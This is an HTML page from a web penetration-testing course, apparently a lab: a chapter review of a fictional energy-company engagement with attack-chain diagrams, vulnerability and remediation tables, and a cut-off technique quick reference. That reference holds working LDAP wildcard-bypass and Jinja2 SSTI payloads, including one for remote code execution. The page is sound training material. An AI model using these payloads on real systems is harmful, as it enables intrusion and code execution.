@@ -1,0 +1,1422 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web application penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Chapter 4 Review: Admin Takeover - Web Application Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#chapter-4-review-admin-takeover" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Web Application Penetration Testing" class="md-header__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Web Application Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Chapter 4 Review: Admin Takeover
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Web Application Penetration Testing" class="md-nav__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Web Application Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W1 -- Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W1 -- Web Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/01_Basic_Directory_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.1 -- Basic Directory Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/02_Technology_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.2 -- Technology Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/03_HTTP_Methods_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.3 -- HTTP Methods Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/04_Header_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.4 -- Header Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/05_Subdomain_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.5 -- Subdomain Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/06_Comprehensive_Web_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.6 -- Comprehensive Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W2 -- Web Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W2 -- Web Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/01_Basic_SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W2.1 -- Basic SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/02_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#engagement-complete" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Engagement Complete
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#full-engagement-retrospective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Full Engagement Retrospective
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Full Engagement Retrospective">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#by-the-numbers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        By the Numbers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Summary
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#complete-attack-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Complete Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation-priorities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation Priorities
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Remediation Priorities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#critical-fix-immediately" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Critical (Fix Immediately)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#high-fix-within-1-week" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        High (Fix Within 1 Week)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#medium-fix-within-1-month" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Medium (Fix Within 1 Month)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technique-quick-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technique Quick Reference
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technique Quick Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ldap-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LDAP Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssti-jinja2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSTI (Jinja2)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#path-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Path Traversal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#api-exploitation-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        API Exploitation Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#self-assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Self-Assessment
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Self-Assessment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#review-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Review Checklist
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-comes-next" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Comes Next
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="chapter-4-review-admin-takeover">Chapter 4 Review: Admin Takeover</h1>
+<h2 id="engagement-complete">Engagement Complete</h2>
+<p>The Meridian Energy Group penetration test is complete. Four chapters covered the full attack lifecycle, from initial network reconnaissance to SCADA database compromise. The capstone exercise in Chapter 4 demonstrated how an attacker chains multiple vulnerabilities across multiple systems to reach the most sensitive data in an energy company's infrastructure.</p>
+<h2 id="full-engagement-retrospective">Full Engagement Retrospective</h2>
+<pre class="mermaid"><code>graph TD
+    subgraph CH1["Chapter 1: Reconnaissance"]
+        R1["Network Mapping"] --&gt; R2["Service Discovery"]
+        R2 --&gt; R3["Credential Collection"]
+    end
+
+    subgraph CH2["Chapter 2: Web Exploitation"]
+        W1["Employee Portal"] --&gt; W2["HR System"]
+        W2 --&gt; W3["Additional Credentials"]
+    end
+
+    subgraph CH3["Chapter 3: Infrastructure"]
+        I1["File Server&lt;br/&gt;Path Traversal"] --&gt; I2["SCADA Credentials"]
+        I3["Monitoring API&lt;br/&gt;IDOR + Mass Assignment + SSRF"] --&gt; I4["Internal Service Access"]
+    end
+
+    subgraph CH4["Chapter 4: Admin Takeover"]
+        A1["LDAP Injection"] --&gt; A2["SSTI / RCE"]
+        A2 --&gt; A3["Credential Discovery"]
+        A3 --&gt; A4["Engineering DB&lt;br/&gt;Master Flag"]
+    end
+
+    R3 --&gt; W1
+    W3 --&gt; I1
+    W3 --&gt; I3
+    I2 --&gt; A1
+    I4 --&gt; A1
+
+    style R1 fill:#00d4ff,color:#000
+    style W1 fill:#6aaa64,color:#fff
+    style I1 fill:#e94560,color:#fff
+    style A4 fill:#ffd700,color:#000</code></pre>
+<h3 id="by-the-numbers">By the Numbers</h3>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Systems compromised</td>
+<td>10+</td>
+</tr>
+<tr>
+<td>Unique vulnerability classes exploited</td>
+<td>8+</td>
+</tr>
+<tr>
+<td>Credentials recovered</td>
+<td>6+ accounts</td>
+</tr>
+<tr>
+<td>Databases accessed</td>
+<td>2 (corporate, engineering)</td>
+</tr>
+<tr>
+<td>Attack chain length (Chapter 4)</td>
+<td>4 phases across 4 systems</td>
+</tr>
+<tr>
+<td>MITRE ATT&amp;CK tactics covered</td>
+<td>6 of 14</td>
+</tr>
+</tbody>
+</table>
+<h3 id="vulnerability-summary">Vulnerability Summary</h3>
+<table>
+<thead>
+<tr>
+<th>Chapter</th>
+<th>Exercise</th>
+<th>Vulnerability</th>
+<th>Severity</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Reconnaissance</td>
+<td>Information exposure</td>
+<td>Medium</td>
+<td>Full network map</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Web Exploitation</td>
+<td>Authentication bypass, data exposure</td>
+<td>High</td>
+<td>Credential theft</td>
+</tr>
+<tr>
+<td>3</td>
+<td>MEG3.1</td>
+<td>Path traversal</td>
+<td>High</td>
+<td>SCADA credential theft</td>
+</tr>
+<tr>
+<td>3</td>
+<td>MEG3.2</td>
+<td>IDOR, mass assignment, SSRF</td>
+<td>Critical</td>
+<td>Internal service compromise</td>
+</tr>
+<tr>
+<td>4</td>
+<td>MEG4.1</td>
+<td>LDAP injection</td>
+<td>High</td>
+<td>Authentication bypass</td>
+</tr>
+<tr>
+<td>4</td>
+<td>MEG4.1</td>
+<td>SSTI (Jinja2)</td>
+<td>Critical</td>
+<td>Remote code execution</td>
+</tr>
+<tr>
+<td>4</td>
+<td>MEG4.1</td>
+<td>Credential in env vars</td>
+<td>Medium</td>
+<td>Lateral movement enabler</td>
+</tr>
+<tr>
+<td>4</td>
+<td>MEG4.1</td>
+<td>Unrestricted DB access</td>
+<td>High</td>
+<td>SCADA data exfiltration</td>
+</tr>
+</tbody>
+</table>
+<h2 id="complete-attack-chain">Complete Attack Chain</h2>
+<p>The following diagram shows the full engagement from Chapter 1 through Chapter 4, with each node representing a system or finding and each edge representing the technique used to move between them:</p>
+<pre class="mermaid"><code>graph LR
+    K["Kali&lt;br/&gt;Attacker"] --&gt;|"nmap, enum"| NET["Network Map"]
+    NET --&gt;|"Creds from&lt;br/&gt;recon"| EP["Employee Portal"]
+    EP --&gt;|"Web exploit"| HR["HR System"]
+    HR --&gt;|"Cred dump"| FS["File Server"]
+    FS --&gt;|"Path traversal&lt;br/&gt;../secrets/"| SCADA_CREDS["SCADA Creds"]
+    HR --&gt;|"Cred dump"| API["Monitoring API"]
+    API --&gt;|"IDOR + Mass&lt;br/&gt;Assignment"| ADMIN_API["API Admin"]
+    ADMIN_API --&gt;|"SSRF"| BACKEND["Internal Backend"]
+    SCADA_CREDS --&gt;|"Intelligence"| ADMIN["Admin Portal"]
+    ADMIN --&gt;|"LDAP injection&lt;br/&gt;password: *"| DASH["Admin Dashboard"]
+    DASH --&gt;|"SSTI in&lt;br/&gt;Report Gen"| RCE["Code Execution"]
+    RCE --&gt;|"env vars"| DB_CREDS["DB Credentials"]
+    DB_CREDS --&gt;|"psql lateral&lt;br/&gt;movement"| ENG_DB["Engineering DB"]
+    ENG_DB --&gt;|"SELECT"| FLAG["Master Flag"]
+
+    style K fill:#e94560,color:#fff
+    style FLAG fill:#ffd700,color:#000
+    style RCE fill:#ff6b6b,color:#fff</code></pre>
+<h2 id="remediation-priorities">Remediation Priorities</h2>
+<p>Based on the full engagement, the following remediation priorities address the highest-impact vulnerabilities first:</p>
+<h3 id="critical-fix-immediately">Critical (Fix Immediately)</h3>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Fix</th>
+<th>Systems Affected</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSTI in Report Generator</td>
+<td>Pass user input as template variables, deploy SandboxedEnvironment</td>
+<td>Admin Portal</td>
+</tr>
+<tr>
+<td>SSRF in Monitoring API</td>
+<td>URL allowlisting, egress filtering</td>
+<td>Monitoring API</td>
+</tr>
+<tr>
+<td>Path traversal on file server</td>
+<td>Canonicalize paths, verify document root prefix</td>
+<td>File Server</td>
+</tr>
+</tbody>
+</table>
+<h3 id="high-fix-within-1-week">High (Fix Within 1 Week)</h3>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Fix</th>
+<th>Systems Affected</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LDAP injection</td>
+<td>Switch to bind authentication, escape input</td>
+<td>Admin Portal, LDAP Server</td>
+</tr>
+<tr>
+<td>Mass assignment</td>
+<td>Server-side field allowlisting on all endpoints</td>
+<td>Monitoring API</td>
+</tr>
+<tr>
+<td>IDOR on alerts</td>
+<td>Authorization checks on every resource access</td>
+<td>Monitoring API</td>
+</tr>
+<tr>
+<td>Credentials in env vars</td>
+<td>Deploy secrets manager (Vault)</td>
+<td>Admin Portal</td>
+</tr>
+</tbody>
+</table>
+<h3 id="medium-fix-within-1-month">Medium (Fix Within 1 Month)</h3>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Fix</th>
+<th>Systems Affected</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>No network segmentation</td>
+<td>Separate IT, OT, and DMZ zones with firewall rules</td>
+<td>All systems</td>
+</tr>
+<tr>
+<td>No WAF</td>
+<td>Deploy WAF in front of all web applications</td>
+<td>All web apps</td>
+</tr>
+<tr>
+<td>No monitoring</td>
+<td>Deploy SIEM with detection rules for injection, traversal, SSRF</td>
+<td>All systems</td>
+</tr>
+<tr>
+<td>Weak credential policy</td>
+<td>Enforce MFA, password complexity, rotation</td>
+<td>All accounts</td>
+</tr>
+</tbody>
+</table>
+<h2 id="technique-quick-reference">Technique Quick Reference</h2>
+<h3 id="ldap-injection">LDAP Injection</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># Wildcard bypass
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Username: s.chen
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Password: *
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a># Filter produced
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>(&amp;(uid=s.chen)(userPassword=*))
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a># Prevention: Use ldap_bind() instead of search filters
+</code></pre></div>
+<h3 id="ssti-jinja2">SSTI (Jinja2)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a># Detection
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>{{7*7}}                      -&gt; 49
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>{{7*&#39;7&#39;}}                    -&gt; 7777777
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a># Information gathering
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>{{config.items()}}           -&gt; App configuration
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>{{request.environ}}          -&gt; WSGI environment
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a># RCE
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>{{cycler.__init__.__globals__.os.popen(&#39;COMMAND&#39;).read()}}
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a># Prevention: Never compile user input as template code
+</code></pre></div>
+<h3 id="path-traversal">Path Traversal</h3>
